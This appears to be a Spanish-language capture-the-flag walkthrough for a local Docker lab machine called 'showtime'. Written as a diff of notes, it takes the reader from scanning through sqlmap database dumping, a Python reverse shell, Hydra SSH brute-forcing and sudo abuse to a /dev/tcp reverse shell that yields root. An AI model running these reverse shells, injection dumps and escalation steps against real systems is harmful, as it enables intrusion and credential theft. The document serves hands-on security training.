@@ -1,0 +1,72 @@
+cd /home/kali/Desktop 
+cd showtime
+chmod +x auto_deploy.sh 
+
+sudo wget https://archive.kali.org/archive-keyring.gpg -O /usr/share/keyrings/kali-archive-keyring.gpg
+
+apt update
+./auto_deploy.sh showtime.tar
+nmap -p- -sS -n 172.17.0.2
+
+git clone https://github.com/danielmiessler/SecLists.git  
+
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://172.17.0.2/FUZZ
+ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u http://172.17.0.3/FUZZ -mc 200
+
+Instalar Foxy Proxy
+hacer lo de la imagen 1, guardar y abrir burpsuite desde kali.
+Despues ingresar a la pagina e ir a login, activar la extensión de foxyproxy e ingresar cualquier dato en las credenciales de acceso, esto generara un request en el programa burpsuite imagen 3
+
+El request entragado copiarlo y pegarlo en un txt
+nano req.txt
+
+sqlmap -r req.txt --batch --level=5 --risk=3 --dbs
+sqlmap -r req.txt --batch 
+sqlmap -r req.txt --batch -D users --tables
+sqlmap -r req.txt --batch -D users -T usuarios --dump
+
+Desactivar Foxy Proxy.
+Ingresar con usuario joe y pass
+
+https://www.revshells.com/
+imagen 4
+
+nc -lvnp 9001 -> Dejar puerto en escucha
+En la pagina copiar desde el import y sin comillas
+nc -lvnp 4545
+
+EN LA PAGINA ATACADA = import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
+
+ls -al /tmp
+
+cat /tmp/.hidden_text.txt
+Copiar infor y pegarla en un TXT y probar con HYDRA
+
+Pasar letras de mayus a minusculas
+hydra -l joe -P pass.txt ssh://172.17.0.2
+
+user = joe pass = chittychittybangbang
+ssh -l joe 172.17.0.2
+sudo -l
+sudo -u luciano /bin/posh
+
+whoami
+sudo -l
+pwd
+cd .. 
+ls
+cd lucioano
+ls
+cat script.sh
+
+echo "sh -i >& /dev/tcp/172.17.0.1/9003 0>&1" > script.sh 
+
+PONER EL PUERTO 9003 EN ESCUCHA -> nc -lvnp 9003
+
+sudo -u root /bin/bash /home/luciano/script.sh 
+
+IR DONDE ESTA EL PUERTO DE ESCUCHA
+
+whoami = root
+
+
